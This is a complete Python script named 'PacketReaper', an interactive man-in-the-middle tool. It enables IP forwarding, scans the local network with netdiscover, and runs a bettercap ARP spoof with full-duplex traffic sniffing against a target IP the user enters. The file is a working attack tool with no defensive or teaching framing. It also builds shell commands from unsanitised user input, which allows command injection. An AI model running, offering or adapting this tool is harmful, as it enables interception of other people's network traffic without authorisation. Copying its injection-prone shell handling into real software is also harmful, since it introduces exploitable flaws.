#!/usr/bin/env python3
import os
import subprocess
import re
import shutil
import sys

# =========================
# Banner
# =========================
def banner():
    print("\033[38;5;196m")  # Red
    print(r"""
      ______
   .-        -.
  /            \
 |,  .-.  .-.  ,|
 | )(_o/  \o_)( |
 |/     /\     \|
 (_     ^^     _)
  \__|IIIIII|__/
   | \IIIIII/ |
   \          /
    `--------`
   PACKETREAPER
    """)
    print("\033[0m")  # Reset
    print("\033[1;37m  Network Recon & MITM Framework | 'Reap the Packets'\033[0m\n")

# =========================
# Dependency & Safety Check
# =========================
def check_dependencies():
    print("\033[1;34m[+] Checking dependencies...\033[0m")
    tools = ["bettercap", "netdiscover", "ping", "ip"]
    missing = []
    for tool in tools:
        if not shutil.which(tool):
            missing.append(tool)
    if missing:
        print(f"\033[1;31m[!] Missing: {', '.join(missing)}\033[0m")
        sys.exit(1)
    if os.geteuid() != 0:
        print("\033[1;31m[!] Run as root (sudo)!\033[0m")
        sys.exit(1)
    print("\033[1;32m[✓] All dependencies OK\033[0m")

# =========================
# Interface Detection
# =========================
def get_interfaces():
    print("\033[1;34m[+] Detecting network interfaces...\033[0m")
    result = subprocess.check_output("ip link show", shell=True).decode()
    interfaces = re.findall(r'^\d+: ([^:]+):', result, re.MULTILINE)
    interfaces = [i for i in interfaces if not i.startswith("lo")]  # Skip loopback
    if not interfaces:
        print("\033[1;31m[!] No active network interfaces found.\033[0m")
        sys.exit(1)
    for idx, iface in enumerate(interfaces):
        print(f"   {idx+1}. {iface}")
    return interfaces

# =========================
# Enable IP Forwarding
# =========================
def enable_ip_forwarding():
    print("\033[1;33m[+] Enabling IP forwarding...\033[0m")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("\033[1;32m[✓] IP forwarding enabled.\033[0m")

# =========================
# Auto Gateway Detection
# =========================
def detect_gateway():
    try:
        result = subprocess.check_output("ip route | grep default", shell=True).decode()
        gateway = re.search(r'default via ([\d\.]+)', result).group(1)
        return gateway
    except:
        return None

# =========================
# Netdiscover Scan
# =========================
def scan_network(interface):
    print(f"\033[1;34m[+] Scanning network on {interface}...\033[0m")
    subprocess.call(f"sudo netdiscover -i {interface} -P", shell=True)

# =========================
# ARP Spoof with Bettercap
# =========================
def arp_spoof(interface, target_ip, gateway_ip):
    print(f"\033[1;31m[+] Starting ARP spoof on {target_ip} via {gateway_ip}...\033[0m")
    os.system(
        f"sudo bettercap -iface {interface} -eval "
        f"'set arp.spoof.targets {target_ip}; "
        f"set arp.spoof.fullduplex true; "
        f"arp.spoof on; net.sniff on'"
    )

# =========================
# Main
# =========================
def main():
    banner()
    check_dependencies()

    interfaces = get_interfaces()
    choice = input("\n[?] Select interface (number): ")
    try:
        iface = interfaces[int(choice)-1]
    except:
        print("[!] Invalid choice.")
        return

    enable_ip_forwarding()

    print("\n\033[1;36m[1]\033[0m Netdiscover scan")
    print("\033[1;36m[2]\033[0m ARP Spoof attack")
    opt = input("\n[?] Choose option: ")

    if opt == "1":
        scan_network(iface)
    elif opt == "2":
        gw = detect_gateway()
        if gw:
            use_auto = input(f"[?] Detected gateway {gw}, use it? [Y/n]: ").strip().lower()
            if use_auto != "n":
                gateway_ip = gw
            else:
                gateway_ip = input("[?] Enter gateway IP: ")
        else:
            gateway_ip = input("[?] Enter gateway IP: ")

        target = input("[?] Target IP: ")
        arp_spoof(iface, target, gateway_ip)
    else:
        print("[!] Invalid option.")

if __name__ == "__main__":
    main()
